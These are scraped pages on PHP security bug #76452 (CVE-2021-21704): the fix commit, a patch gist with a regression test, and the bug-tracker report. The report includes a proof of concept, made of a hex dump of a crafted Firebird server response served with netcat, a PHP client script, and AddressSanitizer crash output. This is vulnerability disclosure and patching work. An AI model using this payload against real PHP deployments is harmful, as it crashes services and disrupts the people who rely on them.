=== Content from github.com_e7c52ea0_20250115_133625.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fa6a13139db522e0c2f9eb26550a47c31b1edde13)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fa6a13139db522e0c2f9eb26550a47c31b1edde13)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  562](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/a6a13139db522e0c2f9eb26550a47c31b1edde13)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix #76452: Crash while parsing blob data in firebird\_fetch\_blob

[Browse files](/php/php-src/tree/a6a13139db522e0c2f9eb26550a47c31b1edde13)
Browse the repository at this point in the history

```
This reapplies [286162e](https://github.com/php/php-src/commit/286162e9b03071c4308e7e92597bca4239f49d89) to the PHP-8.1 (and up)
branches, fixing what might have been caused by a bad merge conflict resolution.
```

* Loading branch information

[![@ramsey](https://avatars.githubusercontent.com/u/42941?s=40&v=4)](/ramsey)

[ramsey](/php/php-src/commits?author=ramsey "View all commits by ramsey")
committed
Jun 7, 2022

1 parent
[93eeec8](/php/php-src/commit/93eeec81f1fbc3f6e25f862ca8aceb7ebc37d444)

commit a6a1313

Showing
**1 changed file**
with
**9 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

10 changes: 9 additions & 1 deletion

10
[ext/pdo\_firebird/firebird\_statement.c](#diff-90d42f012b3b598293c8240b76f60414b7fb9be40e033884d002d27010968de7 "ext/pdo_firebird/firebird_statement.c")

Show comments

[View file](/php/php-src/blob/a6a13139db522e0c2f9eb26550a47c31b1edde13/ext/pdo_firebird/firebird_statement.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -305,7 +305,15 @@ static int firebird\_fetch\_blob(pdo\_stmt\_t \*stmt, int colno, zval \*result, ISC\_QU |
|  |  | zend\_ulong cur\_len; |
|  |  | unsigned short seg\_len; |
|  |  | ISC\_STATUS stat; |
|  |  | zend\_string \*str = zend\_string\_alloc(len, 0); |
|  |  | zend\_string \*str; |
|  |  |  |
|  |  | /\* prevent overflow \*/ |
|  |  | if (len > ZSTR\_MAX\_LEN) { |
|  |  | result = 0; |
|  |  | goto fetch\_blob\_end; |
|  |  | } |
|  |  |  |
|  |  | str = zend\_string\_alloc(len, 0); |
|  |  |  |
|  |  | for (cur\_len = stat = 0; (!stat || stat == isc\_segment) && cur\_len < len; cur\_len += seg\_len) { |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a6a1313`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2Fa6a13139db522e0c2f9eb26550a47c31b1edde13) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_a8c8fdb0_20250115_133623.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=64&v=4)](/cmb69)

# [cmb69](/cmb69)/**[0001-Fix-76452-Crash-while-parsing-blob-data-in-firebird\_.patch](/cmb69/bbf45c1f420fcc16a98d2a9614db8729)** Secret

Created
May 5, 2021 10:50

Show Gist options

* [Download ZIP](/cmb69/bbf45c1f420fcc16a98d2a9614db8729/archive/cf20b8c2e49e6149dced3cc7a579f194786c13e5.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/bbf45c1f420fcc16a98d2a9614db8729.js&quot;&gt;&lt;/script&gt;
* Save cmb69/bbf45c1f420fcc16a98d2a9614db8729 to your computer and use it in GitHub Desktop.

[Code](/cmb69/bbf45c1f420fcc16a98d2a9614db8729)
[Revisions
1](/cmb69/bbf45c1f420fcc16a98d2a9614db8729/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/bbf45c1f420fcc16a98d2a9614db8729.js&quot;&gt;&lt;/script&gt;

Save cmb69/bbf45c1f420fcc16a98d2a9614db8729 to your computer and use it in GitHub Desktop.

[Download ZIP](/cmb69/bbf45c1f420fcc16a98d2a9614db8729/archive/cf20b8c2e49e6149dced3cc7a579f194786c13e5.zip)

Fix for PHP bug #76452

 [Raw](/cmb69/bbf45c1f420fcc16a98d2a9614db8729/raw/cf20b8c2e49e6149dced3cc7a579f194786c13e5/0001-Fix-76452-Crash-while-parsing-blob-data-in-firebird_.patch)

[**0001-Fix-76452-Crash-while-parsing-blob-data-in-firebird\_.patch**](#file-0001-fix-76452-crash-while-parsing-blob-data-in-firebird_-patch)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From 07c77f52e74f1a1ad393d508573ccd9edb54687c Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: "Christoph M. Becker" <cmbecker69@gmx.de> |
|  | Date: Wed, 5 May 2021 12:42:17 +0200 |
|  | Subject: [PATCH] Fix #76452: Crash while parsing blob data in |
|  | firebird\_fetch\_blob |
|  |  |
|  | We need to prevent integer overflow when calling `erealloc()` with |
|  | `len+1`. |
|  | --- |
|  | ext/pdo\_firebird/firebird\_statement.c | 5 +++++ |
|  | ext/pdo\_firebird/tests/bug\_76452.data | Bin 0 -> 856 bytes |
|  | ext/pdo\_firebird/tests/bug\_76452.phpt | 31 ++++++++++++++++++++++++++ |
|  | 3 files changed, 36 insertions(+) |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76452.data |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76452.phpt |
|  |  |
|  | diff --git a/ext/pdo\_firebird/firebird\_statement.c b/ext/pdo\_firebird/firebird\_statement.c |
|  | index 05dfe46848..7520225561 100644 |
|  | --- a/ext/pdo\_firebird/firebird\_statement.c |
|  | +++ b/ext/pdo\_firebird/firebird\_statement.c |
|  | @@ -302,6 +302,11 @@ static int firebird\_fetch\_blob(pdo\_stmt\_t \*stmt, int colno, char \*\*ptr, /\* {{{ \* |
|  | unsigned short seg\_len; |
|  | ISC\_STATUS stat; |
|  |  |
|  | + /\* prevent overflow \*/ |
|  | + if (\*len == ZEND\_ULONG\_MAX) { |
|  | + result = 0; |
|  | + goto fetch\_blob\_end; |
|  | + } |
|  | \*ptr = S->fetch\_buf[colno] = erealloc(S->fetch\_buf[colno], \*len+1); |
|  |  |
|  | for (cur\_len = stat = 0; (!stat || stat == isc\_segment) && cur\_len < \*len; cur\_len += seg\_len) { |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76452.data b/ext/pdo\_firebird/tests/bug\_76452.data |
|  | new file mode 100644 |
|  | index 0000000000000000000000000000000000000000..1bb9d86634437c7b232db7e95c860972f656daf3 |
|  | GIT binary patch |
|  | literal 856 |
|  | zcma)3L2kk@5L}u~a6~DEswZ9nyueYp^%gEjRjaC0P3~~u#+\_I26kZl~uq`c)P&$&c |
|  | z\*\_qj~oe<Gy(;P-b)RUFU0tWBDf8Rg\*FT2}Tj&aWq-`vx4ZT9cT4S=qD@VbZo08$~= |
|  | zS!t(NzRpjX5~0(+6Im)^a;FZM&XV%z#GxxsOmne3CuFT1Gp&~8YLZd8F5e3Ka%GLo |
|  | zBSz+PsjYc~d8R\_p3UIXXhmY@|dkJZM18^GJUw9#KT-8-A+|l!~o<he}1@K\_5%Okh# |
|  | z^x%UdXCn\*1zXPWc&Im5nO~%v+;E8?MKOjwLHea|d\_61L<v95FAxzVwC81(f<k2JLZ |
|  | F)-Nn-EmHsh |
|  |  |
|  | literal 0 |
|  | HcmV?d00001 |
|  |  |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76452.phpt b/ext/pdo\_firebird/tests/bug\_76452.phpt |
|  | new file mode 100644 |
|  | index 0000000000..ae953b70b5 |
|  | --- /dev/null |
|  | +++ b/ext/pdo\_firebird/tests/bug\_76452.phpt |
|  | @@ -0,0 +1,31 @@ |
|  | +--TEST-- |
|  | +Bug ##76452 (Crash while parsing blob data in firebird\_fetch\_blob) |
|  | +--SKIPIF-- |
|  | +<?php require('skipif.inc'); ?> |
|  | +--FILE-- |
|  | +<?php |
|  | +require\_once "payload\_server.inc"; |
|  | + |
|  | +$address = run\_server(\_\_DIR\_\_ . "/bug\_76452.data"); |
|  | + |
|  | +// no need to change the credentials; we're running against a falke server |
|  | +$dsn = "firebird:dbname=inet://$address/test"; |
|  | +$username = 'SYSDBA'; |
|  | +$password = 'masterkey'; |
|  | + |
|  | +$dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  | +$query = $dbh->prepare("select \* from test"); |
|  | +$query->execute(); |
|  | +var\_dump($query->fetch()); |
|  | +?> |
|  | +--EXPECT-- |
|  | +array(4) { |
|  | + ["AAA"]=> |
|  | + string(4) "hihi" |
|  | + [0]=> |
|  | + string(4) "hihi" |
|  | + ["BBBB"]=> |
|  | + NULL |
|  | + [1]=> |
|  | + NULL |
|  | +} |
|  | -- |
|  | 2.31.1.windows.1 |
|  |  |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2Fbbf45c1f420fcc16a98d2a9614db8729)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_d9c70f86_20250115_090358.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Sec Bug](bug.php?id=76452) #76452 | Crash while parsing blob data in firebird\_fetch\_blob | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2018-06-11 20:17 UTC | Modified: | 2021-06-28 04:40 UTC |  | | From: | trichimtrich at gmail dot com | Assigned: | [stas](search.php?cmd=display&assign=stas) ([profile](https://people.php.net/stas)) | | Status: | Closed | Package: | [PDO Firebird](search.php?cmd=display&package_name[]=PDO+Firebird) | | PHP Version: | 7.3.0alpha1 | OS: |  | | Private report: | No | CVE-ID: | [2021-21704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21704) |   View [Developer](bug.php?id=76452&edit=1) [Edit](bug.php?id=76452&edit=2)   **[2018-06-11 20:17 UTC] trichimtrich at gmail dot com** ``` Description: ------------ A bug in pdo_firebase module allows a malicious firebase server or man-in-the-middle attacker to crash PHP.  The length in response can set to -1 to make PHP crash. Vulnerable code in: \php-src\ext\pdo_firebird\firebird_statement.c:281 281: 		item_len = (unsigned short) isc_vax_integer(&bl_info[i], 2); 282:  283: 		if (item == isc_info_blob_total_length) { 284: 			*len = isc_vax_integer(&bl_info[i+2], item_len); 285: 			break; 286: 		} 287: 		i += item_len+2; 288: 	} 289:  290: 	/* we've found the blob's length, now fetch! */ 291:  292: 	if (*len) { 293: 		zend_ulong cur_len; 294: 		unsigned short seg_len; 295: 		ISC_STATUS stat; 296:  297: 		*ptr = S->fetch_buf[colno] = erealloc(*ptr, *len+1); 298:  299: 		for (cur_len = stat = 0; (!stat || stat == isc_segment) && cur_len < *len; cur_len += seg_len) { 300:  301: 			unsigned short chunk_size = (*len-cur_len) > USHRT_MAX ? USHRT_MAX 302: 				: (unsigned short)(*len-cur_len); 303:  304: 			stat = isc_get_segment(H->isc_status, &blobh, &seg_len, chunk_size, &(*ptr)[cur_len]); 305: 		} 306:  307: 		(*ptr)[*len++] = '\0';   $ ./php --version PHP 7.3.0-dev (cli) (built: Jun  9 2018 04:47:18) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.0-dev, Copyright (c) 1998-2018 Zend Technologies  Test script: --------------- $ xxd stmt_blob.bin 00000000: 0000 005e ffff 800f 0000 0001 0000 0005  ...^............ 00000010: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000020: 7574 6800 0000 0000 0000 0000 0000 005c  uth............\ 00000030: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000040: 7574 6800 0000 0000 0000 0000 0000 0009  uth............. 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000060: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000070: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000080: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000090: 0000 0002 0000 0000 0000 0000 0000 0000  ................ 000000a0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000b0: 0000 0004 0000 0000 0000 0000 0000 00a1  ................ 000000c0: 1504 0001 0000 001b 0400 0300 0000 0507  ................ 000000d0: 0400 0000 0000 0407 0400 0200 0000 0904  ................ 000000e0: 0001 0000 000b 0400 c101 0000 0c04 0000  ................ 000000f0: 0000 000d 0400 0000 0000 0e04 0032 0000  .............2.. 00000100: 0010 0300 4141 4111 0400 5445 5354 1206  ....AAA...TEST.. 00000110: 0053 5953 4442 4113 0300 4141 4108 0904  .SYSDBA...AAA... 00000120: 0002 0000 000b 0400 0902 0000 0c04 0000  ................ 00000130: 0000 000d 0400 0000 0000 0e04 0008 0000  ................ 00000140: 0010 0400 4242 4242 1104 0054 4553 5412  ....BBBB...TEST. 00000150: 0600 5359 5344 4241 1304 0042 4242 4208  ..SYSDBA...BBBB. 00000160: 0100 0000 0000 0001 0000 0000 0000 0000  ................ 00000170: 0000 0009 0000 0001 0000 0000 0000 0000  ................ 00000180: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000190: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001a0: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 000001b0: 0000 0042 0000 0000 0000 0001 0000 0000  ...B............ 000001c0: 0000 0004 6869 6869 0000 008b 0000 0000  ....hihi........ 000001d0: 0000 0042 0000 0000 0000 0001 0000 0000  ...B............ 000001e0: 0000 0005 6869 6869 3200 0000 0000 008b  ....hihi2....... 000001f0: 0000 0001 0000 0042 0000 0000 0000 0001  .......B........ 00000200: 0000 0000 0000 0005 6869 6869 3200 0000  ........hihi2... 00000210: 0000 008b 0000 0002 0000 0042 0000 0000  ...........B.... 00000220: 0000 0001 0000 0000 0000 0005 6869 6869  ............hihi 00000230: 3200 0000 0000 008b 0000 0003 0000 0042  2..............B 00000240: 0000 0064 0000 0000 0000 0009 0000 0003  ...d............ 00000250: 0000 0000 0000 0000 0000 0000 0000 0001  ................ 00000260: 0000 0000 0000 0000 0000 0009 0000 0003  ................ 00000270: 0000 0000 0000 0000 0000 0008 0604 00ff  ................ 00000280: ffff ff01 0000 0001 0000 0000 0000 0000  ................ 00000290: 0000 0009 0000 0002 0000 0000 0000 0000  ................ 000002a0: 0000 0005 0300 3132 3300 0000 0000 0001  ......123....... 000002b0: 0000 0000 0000 0000 0000 0009 0000 0000  ................ 000002c0: 0000 0000 0000 0000 0000 0000 0000 0001  ................ 000002d0: 0000 0000 0000 0000 0000 0009 0000 0002  ................ 000002e0: 0000 0000 0000 0000 0000 0000 0000 0001  ................ 000002f0: 0000 0000 0000 0000 0000 0009 ffff ffff  ................ 00000300: 0000 0000 0000 0000 0000 0000 0000 0001  ................ 00000310: 0000 0000 0000 0000 0000 0009 0000 0000  ................ 00000320: 0000 0000 0000 0000 0000 0000 0000 0001  ................ 00000330: 0000 0000 0000 0000 0000 0009 0000 0000  ................ 00000340: 0000 0000 0000 0000 0000 0000 0000 0001  ................ 00000350: 0000 0000 0000 0000                      ........   $ nc -lvp 3050 < stmt_blob.bin   $ cat fire_stmt_blob.php <?php $dsn = 'firebird:dbname=localhost:employee;charset=utf8;'; $username = 'SYSDBA'; $password = 'masterkey';  $dbh = new PDO($dsn, $username, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]); $sql = "select * from test"; $query = $dbh->prepare($sql); $query->execute(); var_dump($query->fetch()); ?>   Expected result: ---------------- No crash  Actual result: -------------- $ ./php fire_stmt_blob.php ================================================================= ==5574==ERROR: AddressSanitizer: negative-size-param: (size=-1)     #0 0x4ce057 in __asan_memcpy /scratch/llvm/clang-4/xenial/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:453:3     #1 0xcd44b1 in fetch_value (/mnt/hgfs/share/htdocs/php+0xcd44b1)     #2 0xccd658 in do_fetch (/mnt/hgfs/share/htdocs/php+0xccd658)     #3 0xcc605c in zim_PDOStatement_fetch (/mnt/hgfs/share/htdocs/php+0xcc605c)     #4 0x12e2d9f in ZEND_DO_FCALL_SPEC_RETVAL_USED_HANDLER (/mnt/hgfs/share/htdocs/php+0x12e2d9f)     #5 0x1212bcf in execute_ex (/mnt/hgfs/share/htdocs/php+0x1212bcf)     #6 0x121320b in zend_execute (/mnt/hgfs/share/htdocs/php+0x121320b)     #7 0x11175c0 in zend_execute_scripts (/mnt/hgfs/share/htdocs/php+0x11175c0)     #8 0xfa4878 in php_execute_script (/mnt/hgfs/share/htdocs/php+0xfa4878)     #9 0x1412cc4 in do_cli (/mnt/hgfs/share/htdocs/php+0x1412cc4)     #10 0x1410e67 in main (/mnt/hgfs/share/htdocs/php+0x1410e67)     #11 0x7f05cd17382f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)     #12 0x43d878 in _start (/mnt/hgfs/share/htdocs/php+0x43d878)  Address 0x7f05c7a87010 is a wild pointer. SUMMARY: AddressSanitizer: negative-size-param /scratch/llvm/clang-4/xenial/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:453:3 in __asan_memcpy ==5574==ABORTING   ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2018-06-20 04:09 UTC] [stas@php.net](//people.php.net/stas)** -Assigned To: +Assigned To: lwe **[2018-06-28 08:31 UTC] trichimtrich at gmail dot com** ``` any update for this one?  ``` **[2021-04-30 14:23 UTC] [cmb@php.net](//people.php.net/cmb)** -Status: Assigned +Status: Verified -Assigned To: lwe +Assigned To: cmb **[2021-05-05 10:54 UTC] [cmb@php.net](//people.php.net/cmb)** -Assigned To: cmb +Assigned To: stas **[2021-05-05 10:54 UTC] [cmb@php.net](//people.php.net/cmb)** ``` Suggested patch: <<https://gist.github.com/cmb69/bbf45c1f420fcc16a98d2a9614db8729>>.  This requires the payload server[1], and is developed against PHP-7.4.  For PHP-7.3 at least some adjustments need to be done. I can do that, but first would like to confirm that the patch and the testing "framework" are generally acceptable.  Stas, what do you think?  [1] <<https://github.com/php/php-src/pull/6940>>  ``` **[2021-06-21 04:54 UTC] [stas@php.net](//people.php.net/stas)** ``` @cmb I think we may want to use safe_erealloc here?  ``` **[2021-06-21 05:10 UTC] [stas@php.net](//people.php.net/stas)** -CVE-ID: +CVE-ID: 2021-21704 **[2021-06-21 06:22 UTC] [stas@php.net](//people.php.net/stas)** -Private report: No +Private report: Yes **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of cmb69 (author) and smalyshev (committer) Revision: <https://github.com/php/php-src/commit/286162e9b03071c4308e7e92597bca4239f49d89> Log: Fix #76452: Crash while parsing blob data in firebird_fetch_blob  ``` **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** -Status: Verified +Status: Closed **[2022-06-07 15:09 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of ramsey Revision: <https://github.com/php/php-src/commit/a6a13139db522e0c2f9eb26550a47c31b1edde13> Log: Fix #76452: Crash while parsing blob data in firebird_fetch_blob  ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 09:01:28 2025 UTC |



=== Content from github.com_f160ad39_20250115_133629.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F286162e9b03071c4308e7e92597bca4239f49d89)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F286162e9b03071c4308e7e92597bca4239f49d89)

